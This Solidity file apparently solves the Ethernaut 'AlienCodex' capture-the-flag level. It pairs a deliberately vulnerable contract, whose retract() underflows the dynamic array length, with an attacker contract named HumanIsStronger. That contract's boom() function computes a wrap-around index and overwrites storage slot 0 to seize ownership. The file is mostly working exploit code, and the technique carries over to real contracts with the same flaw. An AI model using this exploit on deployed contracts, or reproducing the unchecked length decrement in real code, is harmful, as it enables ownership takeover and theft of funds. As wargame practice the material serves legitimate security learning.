// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../../../ctf/contracts/ethernaut/helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract HumanIsStronger {
    address public owner;
    AlienCodex original;

    constructor(address payable _to) public {
        owner = msg.sender;
        original = AlienCodex(_to);
    }

    uint256 overflow = uint256(-1) - uint256(keccak256(abi.encode(1))) + 1;

    function boom(address offender) public {
        original.makeContact();
        original.retract();
        original.revise(overflow, bytes32(uint256(uint160(offender))));
    }
}
